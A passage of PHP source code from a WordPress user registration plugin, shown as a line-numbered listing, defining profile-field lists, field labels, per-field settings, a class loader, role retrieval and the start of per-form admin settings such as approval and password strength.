| [519](#L519) |  |
| [520](#L520) | /\*\* |
| [521](#L521) | \* Get fields excluding in profile tab |
| [522](#L522) | \* |
| [523](#L523) | \* @return array |
| [524](#L524) | \*/ |
| [525](#L525) | functionÂ ur\_exclude\_profile\_details\_fields()Â { |
| [526](#L526) |  |
| [527](#L527) | $fields\_to\_excludeÂ =Â array( |
| [528](#L528) | 'user\_pass', |
| [529](#L529) | 'user\_confirm\_password', |
| [530](#L530) | 'user\_confirm\_email', |
| [531](#L531) | 'invite\_code', |
| [532](#L532) | 'learndash\_course', |
| [533](#L533) | ); |
| [534](#L534) |  |
| [535](#L535) | // Check if the my account page contains [user\_registration\_my\_account] shortcode. |
| [536](#L536) | ifÂ (Â ur\_post\_content\_has\_shortcode(Â 'user\_registration\_my\_account'Â )Â ||Â ur\_post\_content\_has\_shortcode(Â 'user\_registration\_edit\_profile'Â )Â )Â { |
| [537](#L537) | // Push profile\_picture field to fields\_to\_exclude array. |
| [538](#L538) | array\_push(Â $fields\_to\_exclude,Â 'profile\_picture'Â ); |
| [539](#L539) | } |
| [540](#L540) |  |
| [541](#L541) | returnÂ apply\_filters( |
| [542](#L542) | 'user\_registration\_exclude\_profile\_fields', |
| [543](#L543) | $fields\_to\_exclude |
| [544](#L544) | ); |
| [545](#L545) | } |
| [546](#L546) |  |
| [547](#L547) | /\*\* |
| [548](#L548) | \* Get readonly fields in profile tab |
| [549](#L549) | \* |
| [550](#L550) | \* @return array |
| [551](#L551) | \*/ |
| [552](#L552) | functionÂ ur\_readonly\_profile\_details\_fields()Â { |
| [553](#L553) | returnÂ apply\_filters( |
| [554](#L554) | 'user\_registration\_readonly\_profile\_fields', |
| [555](#L555) | array( |
| [556](#L556) | 'user\_login'Â  Â  Â  Â  Â  Â  =>Â array( |
| [557](#L557) | 'message'Â =>Â \_\_(Â 'Username can not be changed.',Â 'user-registration'Â ), |
| [558](#L558) | ), |
| [559](#L559) | 'user\_pass'Â  Â  Â  Â  Â  Â  Â =>Â array( |
| [560](#L560) | 'value'Â  Â =>Â 'password', |
| [561](#L561) | 'message'Â =>Â \_\_(Â 'Passowrd can not be changed.',Â 'user-registration'Â ), |
| [562](#L562) | ), |
| [563](#L563) | 'user\_confirm\_password'Â =>Â array( |
| [564](#L564) | 'value'Â  Â =>Â 'password', |
| [565](#L565) | 'message'Â =>Â \_\_(Â 'Confirm password can not be changed.',Â 'user-registration'Â ), |
| [566](#L566) | ), |
| [567](#L567) | 'user\_confirm\_email'Â  Â  =>Â array( |
| [568](#L568) | 'message'Â =>Â \_\_(Â 'Confirm email can not be changed.',Â 'user-registration'Â ), |
| [569](#L569) | ), |
| [570](#L570) | ) |
| [571](#L571) | ); |
| [572](#L572) | } |
| [573](#L573) |  |
| [574](#L574) | /\*\* |
| [575](#L575) | \* Get profile detail fields. |
| [576](#L576) | \* |
| [577](#L577) | \* @deprecated 1.4.1 |
| [578](#L578) | \* @return void |
| [579](#L579) | \*/ |
| [580](#L580) | functionÂ ur\_get\_account\_details\_fields()Â { |
| [581](#L581) | ur\_deprecated\_function(Â 'ur\_get\_account\_details\_fields',Â '1.4.1',Â 'ur\_exclude\_profile\_details\_fields'Â ); |
| [582](#L582) | } |
| [583](#L583) |  |
| [584](#L584) | /\*\* |
| [585](#L585) | \* Get all fields appearing in profile tab. |
| [586](#L586) | \* |
| [587](#L587) | \* @return array |
| [588](#L588) | \*/ |
| [589](#L589) | functionÂ ur\_get\_user\_profile\_field\_only()Â { |
| [590](#L590) | $user\_fieldsÂ =Â array\_diff(Â ur\_get\_registered\_form\_fields(),Â ur\_exclude\_profile\_details\_fields()Â ); |
| [591](#L591) | returnÂ apply\_filters(Â 'user\_registration\_user\_profile\_field\_only',Â $user\_fieldsÂ ); |
| [592](#L592) | } |
| [593](#L593) |  |
| [594](#L594) | /\*\* |
| [595](#L595) | \* All fields to update without adding prefix. |
| [596](#L596) | \* |
| [597](#L597) | \* @return array |
| [598](#L598) | \*/ |
| [599](#L599) | functionÂ ur\_get\_fields\_without\_prefix()Â { |
| [600](#L600) | $fieldsÂ =Â ur\_get\_user\_field\_only(); |
| [601](#L601) | returnÂ apply\_filters(Â 'user\_registration\_fields\_without\_prefix',Â $fieldsÂ ); |
| [602](#L602) |  |
| [603](#L603) | } |
| [604](#L604) |  |
| [605](#L605) | /\*\* |
| [606](#L606) | \* Get all default fields by WordPress. |
| [607](#L607) | \* |
| [608](#L608) | \* @return array |
| [609](#L609) | \*/ |
| [610](#L610) | functionÂ ur\_get\_user\_field\_only()Â { |
| [611](#L611) | returnÂ apply\_filters( |
| [612](#L612) | 'user\_registration\_user\_form\_fields', |
| [613](#L613) | array( |
| [614](#L614) | 'user\_email', |
| [615](#L615) | 'user\_confirm\_email', |
| [616](#L616) | 'user\_pass', |
| [617](#L617) | 'user\_confirm\_password', |
| [618](#L618) | 'user\_login', |
| [619](#L619) | 'nickname', |
| [620](#L620) | 'first\_name', |
| [621](#L621) | 'last\_name', |
| [622](#L622) | 'user\_url', |
| [623](#L623) | 'display\_name', |
| [624](#L624) | 'description', |
| [625](#L625) | ) |
| [626](#L626) | ); |
| [627](#L627) | } |
| [628](#L628) |  |
| [629](#L629) | /\*\* |
| [630](#L630) | \* Get all extra form fields |
| [631](#L631) | \* |
| [632](#L632) | \* @return array |
| [633](#L633) | \*/ |
| [634](#L634) | functionÂ ur\_get\_other\_form\_fields()Â { |
| [635](#L635) | $registeredÂ  =Â ur\_get\_registered\_form\_fields(); |
| [636](#L636) | $user\_fieldsÂ =Â ur\_get\_user\_field\_only(); |
| [637](#L637) | $resultÂ  Â  Â  =Â array\_diff(Â $registered,Â $user\_fieldsÂ ); |
| [638](#L638) |  |
| [639](#L639) | returnÂ apply\_filters(Â 'user\_registration\_other\_form\_fields',Â $resultÂ ); |
| [640](#L640) | } |
| [641](#L641) |  |
| [642](#L642) | /\*\* |
| [643](#L643) | \* All default fields storing in usermeta table |
| [644](#L644) | \* |
| [645](#L645) | \* @return mixed|array |
| [646](#L646) | \*/ |
| [647](#L647) | functionÂ ur\_get\_registered\_user\_meta\_fields()Â { |
| [648](#L648) | returnÂ apply\_filters( |
| [649](#L649) | 'user\_registration\_registered\_user\_meta\_fields', |
| [650](#L650) | array( |
| [651](#L651) | 'nickname', |
| [652](#L652) | 'first\_name', |
| [653](#L653) | 'last\_name', |
| [654](#L654) | 'description', |
| [655](#L655) | ) |
| [656](#L656) | ); |
| [657](#L657) | } |
| [658](#L658) |  |
| [659](#L659) | /\*\* |
| [660](#L660) | \* All registered form fields |
| [661](#L661) | \* |
| [662](#L662) | \* @return mixed|array |
| [663](#L663) | \*/ |
| [664](#L664) | functionÂ ur\_get\_registered\_form\_fields()Â { |
| [665](#L665) | returnÂ apply\_filters( |
| [666](#L666) | 'user\_registration\_registered\_form\_fields', |
| [667](#L667) | array( |
| [668](#L668) | 'user\_email', |
| [669](#L669) | 'user\_confirm\_email', |
| [670](#L670) | 'user\_pass', |
| [671](#L671) | 'user\_confirm\_password', |
| [672](#L672) | 'user\_login', |
| [673](#L673) | 'nickname', |
| [674](#L674) | 'first\_name', |
| [675](#L675) | 'last\_name', |
| [676](#L676) | 'user\_url', |
| [677](#L677) | 'display\_name', |
| [678](#L678) | 'description', |
| [679](#L679) | 'text', |
| [680](#L680) | 'password', |
| [681](#L681) | 'email', |
| [682](#L682) | 'select', |
| [683](#L683) | 'country', |
| [684](#L684) | 'textarea', |
| [685](#L685) | 'number', |
| [686](#L686) | 'date', |
| [687](#L687) | 'checkbox', |
| [688](#L688) | 'privacy\_policy', |
| [689](#L689) | 'radio', |
| [690](#L690) | ) |
| [691](#L691) | ); |
| [692](#L692) | } |
| [693](#L693) |  |
| [694](#L694) | /\*\* |
| [695](#L695) | \* All registered form fields with default labels |
| [696](#L696) | \* |
| [697](#L697) | \* @return mixed|array |
| [698](#L698) | \*/ |
| [699](#L699) | functionÂ ur\_get\_registered\_form\_fields\_with\_default\_labels()Â { |
| [700](#L700) | returnÂ apply\_filters( |
| [701](#L701) | 'user\_registration\_registered\_form\_fields\_with\_default\_labels', |
| [702](#L702) | array( |
| [703](#L703) | 'user\_email'Â  Â  Â  Â  Â  Â  =>Â \_\_(Â 'User Email',Â 'user-registration'Â ), |
| [704](#L704) | 'user\_confirm\_email'Â  Â  =>Â \_\_(Â 'User Confirm Email',Â 'user-registration'Â ), |
| [705](#L705) | 'user\_pass'Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'User Pass',Â 'user-registration'Â ), |
| [706](#L706) | 'user\_confirm\_password'Â =>Â \_\_(Â 'User Confirm Password',Â 'user-registration'Â ), |
| [707](#L707) | 'user\_login'Â  Â  Â  Â  Â  Â  =>Â \_\_(Â 'User Login',Â 'user-registration'Â ), |
| [708](#L708) | 'nickname'Â  Â  Â  Â  Â  Â  Â  =>Â \_\_(Â 'Nickname',Â 'user-registration'Â ), |
| [709](#L709) | 'first\_name'Â  Â  Â  Â  Â  Â  =>Â \_\_(Â 'First Name',Â 'user-registration'Â ), |
| [710](#L710) | 'last\_name'Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Last Name',Â 'user-registration'Â ), |
| [711](#L711) | 'user\_url'Â  Â  Â  Â  Â  Â  Â  =>Â \_\_(Â 'User URL',Â 'user-registration'Â ), |
| [712](#L712) | 'display\_name'Â  Â  Â  Â  Â  =>Â \_\_(Â 'Display Name',Â 'user-registration'Â ), |
| [713](#L713) | 'description'Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Description',Â 'user-registration'Â ), |
| [714](#L714) | 'text'Â  Â  Â  Â  Â  Â  Â  Â  Â  =>Â \_\_(Â 'Text',Â 'user-registration'Â ), |
| [715](#L715) | 'password'Â  Â  Â  Â  Â  Â  Â  =>Â \_\_(Â 'Password',Â 'user-registration'Â ), |
| [716](#L716) | 'email'Â  Â  Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Secondary Email',Â 'user-registration'Â ), |
| [717](#L717) | 'select'Â  Â  Â  Â  Â  Â  Â  Â  =>Â \_\_(Â 'Select',Â 'user-registration'Â ), |
| [718](#L718) | 'country'Â  Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Country',Â 'user-registration'Â ), |
| [719](#L719) | 'textarea'Â  Â  Â  Â  Â  Â  Â  =>Â \_\_(Â 'Textarea',Â 'user-registration'Â ), |
| [720](#L720) | 'number'Â  Â  Â  Â  Â  Â  Â  Â  =>Â \_\_(Â 'Number',Â 'user-registration'Â ), |
| [721](#L721) | 'date'Â  Â  Â  Â  Â  Â  Â  Â  Â  =>Â \_\_(Â 'Date',Â 'user-registration'Â ), |
| [722](#L722) | 'checkbox'Â  Â  Â  Â  Â  Â  Â  =>Â \_\_(Â 'Checkbox',Â 'user-registration'Â ), |
| [723](#L723) | 'privacy\_policy'Â  Â  Â  Â  =>Â \_\_(Â 'Privacy Policy',Â 'user-registration'Â ), |
| [724](#L724) | 'radio'Â  Â  Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Radio',Â 'user-registration'Â ), |
| [725](#L725) | 'hidden'Â  Â  Â  Â  Â  Â  Â  Â  =>Â \_\_(Â 'Hidden',Â 'user-registration'Â ), |
| [726](#L726) | ) |
| [727](#L727) | ); |
| [728](#L728) | } |
| [729](#L729) |  |
| [730](#L730) | /\*\* |
| [731](#L731) | \* General settings for each fields |
| [732](#L732) | \* |
| [733](#L733) | \* @param string $id id for each field. |
| [734](#L734) | \* @return mixed|array |
| [735](#L735) | \*/ |
| [736](#L736) | functionÂ ur\_get\_general\_settings(Â $idÂ )Â { |
| [737](#L737) |  |
| [738](#L738) | $general\_settingsÂ =Â array( |
| [739](#L739) | 'label'Â  Â  Â  Â =>Â array( |
| [740](#L740) | 'setting\_id'Â  =>Â 'label', |
| [741](#L741) | 'type'Â  Â  Â  Â  =>Â 'text', |
| [742](#L742) | 'label'Â  Â  Â  Â =>Â \_\_(Â 'Label',Â 'user-registration'Â ), |
| [743](#L743) | 'name'Â  Â  Â  Â  =>Â 'ur\_general\_setting[label]', |
| [744](#L744) | 'placeholder'Â =>Â \_\_(Â 'Label',Â 'user-registration'Â ), |
| [745](#L745) | 'required'Â  Â  =>Â true, |
| [746](#L746) | 'tip'Â  Â  Â  Â  Â =>Â \_\_(Â 'Enter text for the form field label. This is recommended and can be hidden in the Advanced Settings.',Â 'user-registration'Â ), |
| [747](#L747) | ), |
| [748](#L748) | 'description'Â =>Â array( |
| [749](#L749) | 'setting\_id'Â  =>Â 'description', |
| [750](#L750) | 'type'Â  Â  Â  Â  =>Â 'textarea', |
| [751](#L751) | 'label'Â  Â  Â  Â =>Â \_\_(Â 'Description',Â 'user-registration'Â ), |
| [752](#L752) | 'name'Â  Â  Â  Â  =>Â 'ur\_general\_setting[description]', |
| [753](#L753) | 'placeholder'Â =>Â \_\_(Â 'Description',Â 'user-registration'Â ), |
| [754](#L754) | 'required'Â  Â  =>Â true, |
| [755](#L755) | 'tip'Â  Â  Â  Â  Â =>Â \_\_(Â 'Enter text for the form field description.',Â 'user-registration'Â ), |
| [756](#L756) | ), |
| [757](#L757) | 'field\_name'Â  =>Â array( |
| [758](#L758) | 'setting\_id'Â  =>Â 'field-name', |
| [759](#L759) | 'type'Â  Â  Â  Â  =>Â 'text', |
| [760](#L760) | 'label'Â  Â  Â  Â =>Â \_\_(Â 'Field Name',Â 'user-registration'Â ), |
| [761](#L761) | 'name'Â  Â  Â  Â  =>Â 'ur\_general\_setting[field\_name]', |
| [762](#L762) | 'placeholder'Â =>Â \_\_(Â 'Field Name',Â 'user-registration'Â ), |
| [763](#L763) | 'required'Â  Â  =>Â true, |
| [764](#L764) | 'tip'Â  Â  Â  Â  Â =>Â \_\_(Â 'Unique key for the field.',Â 'user-registration'Â ), |
| [765](#L765) | ), |
| [766](#L766) |  |
| [767](#L767) | 'placeholder'Â =>Â array( |
| [768](#L768) | 'setting\_id'Â  =>Â 'placeholder', |
| [769](#L769) | 'type'Â  Â  Â  Â  =>Â 'text', |
| [770](#L770) | 'label'Â  Â  Â  Â =>Â \_\_(Â 'Placeholder',Â 'user-registration'Â ), |
| [771](#L771) | 'name'Â  Â  Â  Â  =>Â 'ur\_general\_setting[placeholder]', |
| [772](#L772) | 'placeholder'Â =>Â \_\_(Â 'Placeholder',Â 'user-registration'Â ), |
| [773](#L773) | 'required'Â  Â  =>Â true, |
| [774](#L774) | 'tip'Â  Â  Â  Â  Â =>Â \_\_(Â 'Enter placeholder for the field.',Â 'user-registration'Â ), |
| [775](#L775) | ), |
| [776](#L776) | 'required'Â  Â  =>Â array( |
| [777](#L777) | 'setting\_id'Â  =>Â 'required', |
| [778](#L778) | 'type'Â  Â  Â  Â  =>Â 'toggle', |
| [779](#L779) | 'label'Â  Â  Â  Â =>Â \_\_(Â 'Required',Â 'user-registration'Â ), |
| [780](#L780) | 'name'Â  Â  Â  Â  =>Â 'ur\_general\_setting[required]', |
| [781](#L781) | 'placeholder'Â =>Â '', |
| [782](#L782) | 'required'Â  Â  =>Â true, |
| [783](#L783) | 'default'Â  Â  Â =>Â 'false', |
| [784](#L784) | 'tip'Â  Â  Â  Â  Â =>Â \_\_(Â 'Check this option to mark the field required. A form will not submit unless all required fields are provided.',Â 'user-registration'Â ), |
| [785](#L785) | ), |
| [786](#L786) | 'hide\_label'Â  =>Â array( |
| [787](#L787) | 'setting\_id'Â  =>Â 'hide-label', |
| [788](#L788) | 'type'Â  Â  Â  Â  =>Â 'toggle', |
| [789](#L789) | 'label'Â  Â  Â  Â =>Â \_\_(Â 'Hide Label',Â 'user-registration'Â ), |
| [790](#L790) | 'name'Â  Â  Â  Â  =>Â 'ur\_general\_setting[hide\_label]', |
| [791](#L791) | 'placeholder'Â =>Â '', |
| [792](#L792) | 'required'Â  Â  =>Â true, |
| [793](#L793) | 'default'Â  Â  Â =>Â 'false', |
| [794](#L794) | 'tip'Â  Â  Â  Â  Â =>Â \_\_(Â 'Check this option to hide the label of this field.',Â 'user-registration'Â ), |
| [795](#L795) | ), |
| [796](#L796) | ); |
| [797](#L797) |  |
| [798](#L798) | $exclude\_placeholderÂ =Â apply\_filters( |
| [799](#L799) | 'user\_registration\_exclude\_placeholder', |
| [800](#L800) | array( |
| [801](#L801) | 'checkbox', |
| [802](#L802) | 'privacy\_policy', |
| [803](#L803) | 'radio', |
| [804](#L804) | 'file', |
| [805](#L805) | 'mailchimp', |
| [806](#L806) | 'hidden', |
| [807](#L807) | ) |
| [808](#L808) | ); |
| [809](#L809) | $strip\_idÂ  Â  Â  Â  Â  Â  =Â str\_replace(Â 'user\_registration\_',Â '',Â $idÂ ); |
| [810](#L810) |  |
| [811](#L811) | ifÂ (Â in\_array(Â $strip\_id,Â $exclude\_placeholder,Â trueÂ )Â )Â { |
| [812](#L812) | unset(Â $general\_settings['placeholder']Â ); |
| [813](#L813) | } |
| [814](#L814) |  |
| [815](#L815) | $choices\_fieldsÂ =Â array(Â 'radio',Â 'select',Â 'checkbox'Â ); |
| [816](#L816) |  |
| [817](#L817) | ifÂ (Â in\_array(Â $strip\_id,Â $choices\_fields,Â trueÂ )Â )Â { |
| [818](#L818) |  |
| [819](#L819) | $settings['options']Â =Â array( |
| [820](#L820) | 'setting\_id'Â  =>Â 'options', |
| [821](#L821) | 'type'Â  Â  Â  Â  =>Â 'checkbox'Â ===Â $strip\_idÂ ?Â 'checkbox'Â :Â 'radio', |
| [822](#L822) | 'label'Â  Â  Â  Â =>Â \_\_(Â 'Options',Â 'user-registration'Â ), |
| [823](#L823) | 'name'Â  Â  Â  Â  =>Â 'ur\_general\_setting[options]', |
| [824](#L824) | 'placeholder'Â =>Â '', |
| [825](#L825) | 'required'Â  Â  =>Â true, |
| [826](#L826) | 'options'Â  Â  Â =>Â array( |
| [827](#L827) | \_\_(Â 'First Choice',Â 'user-registration'Â ), |
| [828](#L828) | \_\_(Â 'Second Choice',Â 'user-registration'Â ), |
| [829](#L829) | \_\_(Â 'Third Choice',Â 'user-registration'Â ), |
| [830](#L830) | ), |
| [831](#L831) | ); |
| [832](#L832) |  |
| [833](#L833) | $general\_settingsÂ =Â ur\_insert\_after\_helper(Â $general\_settings,Â $settings,Â 'field\_name'Â ); |
| [834](#L834) | } |
| [835](#L835) | ifÂ (Â 'privacy\_policy'Â ===Â $strip\_idÂ ||Â 'user\_confirm\_email'Â ===Â $strip\_idÂ ||Â 'user\_confirm\_password'Â ===Â $strip\_idÂ ||Â in\_array(Â $strip\_id,Â ur\_get\_required\_fields()Â )Â )Â { |
| [836](#L836) | $general\_settings['required']Â =Â array( |
| [837](#L837) | 'setting\_id'Â  =>Â '', |
| [838](#L838) | 'type'Â  Â  Â  Â  =>Â 'hidden', |
| [839](#L839) | 'label'Â  Â  Â  Â =>Â '', |
| [840](#L840) | 'name'Â  Â  Â  Â  =>Â 'ur\_general\_setting[required]', |
| [841](#L841) | 'placeholder'Â =>Â '', |
| [842](#L842) | 'default'Â  Â  Â =>Â true, |
| [843](#L843) | 'required'Â  Â  =>Â true, |
| [844](#L844) | ); |
| [845](#L845) | } |
| [846](#L846) |  |
| [847](#L847) | returnÂ apply\_filters(Â 'user\_registration\_field\_options\_general\_settings',Â $general\_settings,Â $idÂ ); |
| [848](#L848) | } |
| [849](#L849) |  |
| [850](#L850) | /\*\* |
| [851](#L851) | \* Insert in between the indexes in multidimensional array. |
| [852](#L852) | \* |
| [853](#L853) | \* @sinceÂ  1.5.7 |
| [854](#L854) | \* @paramÂ  arrayÂ  $itemsÂ  Â  Â  An array of items. |
| [855](#L855) | \* @paramÂ  arrayÂ  $new\_itemsÂ  New items to insert inbetween. |
| [856](#L856) | \* @paramÂ  string $afterÂ  Â  Â  Index to insert after. |
| [857](#L857) | \* |
| [858](#L858) | \* @return arrayÂ  Â  Â  Â  Â  Â  Â  Ordered array of items. |
| [859](#L859) | \*/ |
| [860](#L860) | functionÂ ur\_insert\_after\_helper(Â $items,Â $new\_items,Â $afterÂ )Â { |
| [861](#L861) |  |
| [862](#L862) | // Search for the item position and +1 since is after the selected item key. |
| [863](#L863) | $positionÂ =Â array\_search(Â $after,Â array\_keys(Â $itemsÂ ),Â trueÂ )Â +Â 1; |
| [864](#L864) |  |
| [865](#L865) | // Insert the new item. |
| [866](#L866) | $return\_itemsÂ  =Â array\_slice(Â $items,Â 0,Â $position,Â trueÂ ); |
| [867](#L867) | $return\_itemsÂ +=Â $new\_items; |
| [868](#L868) | $return\_itemsÂ +=Â array\_slice(Â $items,Â $position,Â count(Â $itemsÂ )Â -Â $position,Â trueÂ ); |
| [869](#L869) |  |
| [870](#L870) | returnÂ $return\_items; |
| [871](#L871) | } |
| [872](#L872) |  |
| [873](#L873) | /\*\* |
| [874](#L874) | \* Load form field class. |
| [875](#L875) | \* |
| [876](#L876) | \* @param string $class\_key Class Key. |
| [877](#L877) | \*/ |
| [878](#L878) | functionÂ ur\_load\_form\_field\_class(Â $class\_keyÂ )Â { |
| [879](#L879) | $exploded\_classÂ =Â explode(Â '\_',Â $class\_keyÂ ); |
| [880](#L880) | $class\_pathÂ  Â  Â =Â UR\_FORM\_PATHÂ .Â 'class-ur-'Â .Â join(Â '-',Â array\_map(Â 'strtolower',Â $exploded\_classÂ )Â )Â .Â '.php'; |
| [881](#L881) | $class\_nameÂ  Â  Â =Â 'UR\_Form\_Field\_'Â .Â join(Â '\_',Â array\_map(Â 'ucwords',Â $exploded\_classÂ )Â ); |
| [882](#L882) | $class\_pathÂ  Â  Â =Â apply\_filters(Â 'user\_registration\_form\_field\_'Â .Â $class\_keyÂ .Â '\_path',Â $class\_pathÂ ); |
| [883](#L883) | /\* Backward Compat since 1.4.0 \*/ |
| [884](#L884) | ifÂ (Â file\_exists(Â $class\_pathÂ )Â )Â { |
| [885](#L885) | $class\_nameÂ =Â 'UR\_'Â .Â join(Â '\_',Â array\_map(Â 'ucwords',Â $exploded\_classÂ )Â ); |
| [886](#L886) | ifÂ (Â !Â class\_exists(Â $class\_nameÂ )Â )Â { |
| [887](#L887) | include\_onceÂ $class\_path; |
| [888](#L888) | } |
| [889](#L889) | } |
| [890](#L890) | /\* Backward compat end\*/ |
| [891](#L891) | returnÂ $class\_name; |
| [892](#L892) | } |
| [893](#L893) |  |
| [894](#L894) | /\*\* |
| [895](#L895) | \* List of all roles |
| [896](#L896) | \* |
| [897](#L897) | \* @return array $all\_roles |
| [898](#L898) | \*/ |
| [899](#L899) | functionÂ ur\_get\_default\_admin\_roles()Â { |
| [900](#L900) | globalÂ $wp\_roles; |
| [901](#L901) |  |
| [902](#L902) | ifÂ (Â !Â class\_exists(Â 'WP\_Roles'Â )Â )Â { |
| [903](#L903) | return; |
| [904](#L904) | } |
| [905](#L905) |  |
| [906](#L906) | ifÂ (Â !Â isset(Â $wp\_rolesÂ )Â )Â { |
| [907](#L907) | $wp\_rolesÂ =Â newÂ WP\_Roles();Â // @codingStandardsIgnoreLine |
| [908](#L908) | } |
| [909](#L909) |  |
| [910](#L910) | $rolesÂ  Â  Â =Â isset(Â $wp\_roles->rolesÂ )Â ?Â $wp\_roles->rolesÂ :Â array(); |
| [911](#L911) | $all\_rolesÂ =Â array(); |
| [912](#L912) |  |
| [913](#L913) | foreachÂ (Â $rolesÂ asÂ $role\_keyÂ =>Â $roleÂ )Â { |
| [914](#L914) | $all\_roles[Â $role\_keyÂ ]Â =Â $role['name']; |
| [915](#L915) | } |
| [916](#L916) |  |
| [917](#L917) | returnÂ apply\_filters(Â 'user\_registration\_user\_default\_roles',Â $all\_rolesÂ ); |
| [918](#L918) | } |
| [919](#L919) |  |
| [920](#L920) |  |
| [921](#L921) | /\*\* |
| [922](#L922) | \* Random number generated by time() |
| [923](#L923) | \* |
| [924](#L924) | \* @return int |
| [925](#L925) | \*/ |
| [926](#L926) | functionÂ ur\_get\_random\_number()Â { |
| [927](#L927) | returnÂ time(); |
| [928](#L928) | } |
| [929](#L929) |  |
| [930](#L930) | /\*\* |
| [931](#L931) | \* General Form settings |
| [932](#L932) | \* |
| [933](#L933) | \* @param int $form\_idÂ  Form ID. |
| [934](#L934) | \* |
| [935](#L935) | \* @since 1.0.1 |
| [936](#L936) | \* |
| [937](#L937) | \* @return array Form settings. |
| [938](#L938) | \*/ |
| [939](#L939) | functionÂ ur\_admin\_form\_settings\_fields(Â $form\_idÂ )Â { |
| [940](#L940) |  |
| [941](#L941) | $all\_rolesÂ =Â ur\_get\_default\_admin\_roles(); |
| [942](#L942) |  |
| [943](#L943) | $argumentsÂ =Â array( |
| [944](#L944) | 'form\_id'Â  Â  Â  =>Â $form\_id, |
| [945](#L945) |  |
| [946](#L946) | 'setting\_data'Â =>Â array( |
| [947](#L947) | array( |
| [948](#L948) | 'label'Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'User Approval And Login Option',Â 'user-registration'Â ), |
| [949](#L949) | 'description'Â  Â  Â  Â =>Â \_\_(Â 'This option lets you choose login option after user registration.',Â 'user-registration'Â ), |
| [950](#L950) | 'id'Â  Â  Â  Â  Â  Â  Â  Â  =>Â 'user\_registration\_form\_setting\_login\_options', |
| [951](#L951) | 'default'Â  Â  Â  Â  Â  Â =>Â ur\_get\_single\_post\_meta(Â $form\_id,Â 'user\_registration\_form\_setting\_login\_options',Â get\_option(Â 'user\_registration\_general\_setting\_login\_options'Â )Â ), |
| [952](#L952) | 'type'Â  Â  Â  Â  Â  Â  Â  =>Â 'select', |
| [953](#L953) | 'class'Â  Â  Â  Â  Â  Â  Â =>Â array(Â 'ur-enhanced-select'Â ), |
| [954](#L954) | 'custom\_attributes'Â =>Â array(), |
| [955](#L955) | 'input\_class'Â  Â  Â  Â =>Â array(), |
| [956](#L956) | 'required'Â  Â  Â  Â  Â  =>Â false, |
| [957](#L957) | 'options'Â  Â  Â  Â  Â  Â =>Â ur\_login\_option(), |
| [958](#L958) | 'tip'Â  Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Login method that should be used by the users registered through this form.',Â 'user-registration'Â ), |
| [959](#L959) | ), |
| [960](#L960) | array( |
| [961](#L961) | 'label'Â  Â  Â  Â =>Â \_\_(Â 'Send User Approval Link in Email',Â 'user-registration'Â ), |
| [962](#L962) | 'description'Â =>Â '', |
| [963](#L963) | 'id'Â  Â  Â  Â  Â  =>Â 'user\_registration\_form\_setting\_enable\_email\_approval', |
| [964](#L964) | 'type'Â  Â  Â  Â  =>Â 'toggle', |
| [965](#L965) | 'tip'Â  Â  Â  Â  Â =>Â \_\_(Â 'Check to receive a link with token in email to approve the users directly.',Â 'user-registration'Â ), |
| [966](#L966) | 'css'Â  Â  Â  Â  Â =>Â 'min-width: 350px;', |
| [967](#L967) | 'default'Â  Â  Â =>Â ur\_get\_approval\_default(Â $form\_idÂ ), |
| [968](#L968) | ), |
| [969](#L969) | array( |
| [970](#L970) | 'type'Â  Â  Â  Â  Â  Â  Â  =>Â 'select', |
| [971](#L971) | 'label'Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Default User Role',Â 'user-registration'Â ), |
| [972](#L972) | 'description'Â  Â  Â  Â =>Â '', |
| [973](#L973) | 'required'Â  Â  Â  Â  Â  =>Â false, |
| [974](#L974) | 'id'Â  Â  Â  Â  Â  Â  Â  Â  =>Â 'user\_registration\_form\_setting\_default\_user\_role', |
| [975](#L975) | 'class'Â  Â  Â  Â  Â  Â  Â =>Â array(Â 'ur-enhanced-select'Â ), |
| [976](#L976) | 'input\_class'Â  Â  Â  Â =>Â array(), |
| [977](#L977) | 'options'Â  Â  Â  Â  Â  Â =>Â $all\_roles, |
| [978](#L978) | 'custom\_attributes'Â =>Â array(), |
| [979](#L979) | 'default'Â  Â  Â  Â  Â  Â =>Â ur\_get\_single\_post\_meta(Â $form\_id,Â 'user\_registration\_form\_setting\_default\_user\_role',Â get\_option(Â 'user\_registration\_form\_setting\_default\_user\_role',Â 'subscriber'Â )Â ), |
| [980](#L980) | 'tip'Â  Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Default role for the users registered through this form.',Â 'user-registration'Â ), |
| [981](#L981) | ), |
| [982](#L982) | array( |
| [983](#L983) | 'type'Â  Â  Â  Â  Â  Â  Â  =>Â 'toggle', |
| [984](#L984) | 'label'Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Enable Strong Password',Â 'user-registration'Â ), |
| [985](#L985) | 'description'Â  Â  Â  Â =>Â '', |
| [986](#L986) | 'required'Â  Â  Â  Â  Â  =>Â false, |
| [987](#L987) | 'id'Â  Â  Â  Â  Â  Â  Â  Â  =>Â 'user\_registration\_form\_setting\_enable\_strong\_password', |
| [988](#L988) | 'class'Â  Â  Â  Â  Â  Â  Â =>Â array(Â 'ur-enhanced-select'Â ), |
| [989](#L989) | 'input\_class'Â  Â  Â  Â =>Â array(), |
| [990](#L990) | 'custom\_attributes'Â =>Â array(), |
| [991](#L991) | 'default'Â  Â  Â  Â  Â  Â =>Â ur\_get\_single\_post\_meta(Â $form\_id,Â 'user\_registration\_form\_setting\_enable\_strong\_password',Â ur\_string\_to\_bool(Â get\_option(Â 'user\_registration\_form\_setting\_enable\_strong\_password',Â 1Â )Â )Â ), |
| [992](#L992) | 'tip'Â  Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Make strong password compulsary.',Â 'user-registration'Â ), |
| [993](#L993) | ), |
| [994](#L994) | array( |
| [995](#L995) | 'type'Â  Â  Â  Â  Â  Â  Â  =>Â 'radio-group', |
| [996](#L996) | 'label'Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Minimum Password Strength',Â 'user-registration'Â ), |
| [997](#L997) | 'description'Â  Â  Â  Â =>Â '', |
| [998](#L998) | 'required'Â  Â  Â  Â  Â  =>Â false, |
